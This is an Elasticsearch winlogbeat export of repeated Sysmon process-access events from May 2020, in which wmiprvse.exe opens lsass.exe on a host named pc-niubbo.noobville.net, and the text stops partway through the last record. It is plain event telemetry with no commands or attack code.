    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342261",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:32.570"
                },
                "time_created": "2020-05-29T19:52:32.573811"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342262",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:35.600"
                },
                "time_created": "2020-05-29T19:52:35.615707"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342263",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:35.663"
                },
                "time_created": "2020-05-29T19:52:35.663795"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342264",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:38.693"
                },
                "time_created": "2020-05-29T19:52:38.706938"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342265",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:38.740"
                },
                "time_created": "2020-05-29T19:52:38.755053"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342266",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:41.802"
                },
                "time_created": "2020-05-29T19:52:41.816547"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342267",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:41.849"
                },
                "time_created": "2020-05-29T19:52:41.865290"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342268",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:44.895"
                },
                "time_created": "2020-05-29T19:52:44.911137"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342269",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:44.957"
                },
                "time_created": "2020-05-29T19:52:44.959236"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "342270",
                    "Execution": {
                        "@ProcessID": "2472",
                        "@ThreadID": "812"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-5148-5ed1-0000-00100e320400}",
                    "SourceProcessId": "1404",
                    "SourceThreadId": "5272",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-50e4-5ed1-0000-00103f9d0000}",
                    "TargetProcessId": "680",
                    "UtcTime": "2020-05-29 19:52:47.988"
                },
